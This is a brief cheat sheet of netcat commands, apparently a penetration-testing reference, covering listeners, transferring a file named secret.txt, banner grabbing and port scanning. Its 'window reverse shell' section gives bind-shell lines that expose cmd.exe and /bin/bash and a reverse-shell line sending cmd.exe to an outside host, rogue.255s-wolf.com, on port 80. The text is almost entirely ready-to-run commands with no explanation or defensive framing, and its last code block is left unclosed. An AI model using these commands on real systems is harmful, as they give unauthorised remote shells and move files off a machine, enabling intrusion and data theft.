# netcat

Netcat commands:

```
c:> nc -l -p 31337
nc 192.168.0.10 31337

c:> nc -v -w 30 -p 31337 -l < secret.txt
nc -v -w 2 192.168.0.10 31337 > secret.txt
```

Banner Grabbing:

```
nc 192.168.0.10 80
```


window reverse shell:

```
c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc rogue.255s-wolf.com 80 -e cmd.exe
nc -lp 80
nc -lp 31337 -e /bin/bash
nc 192.168.0.11 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
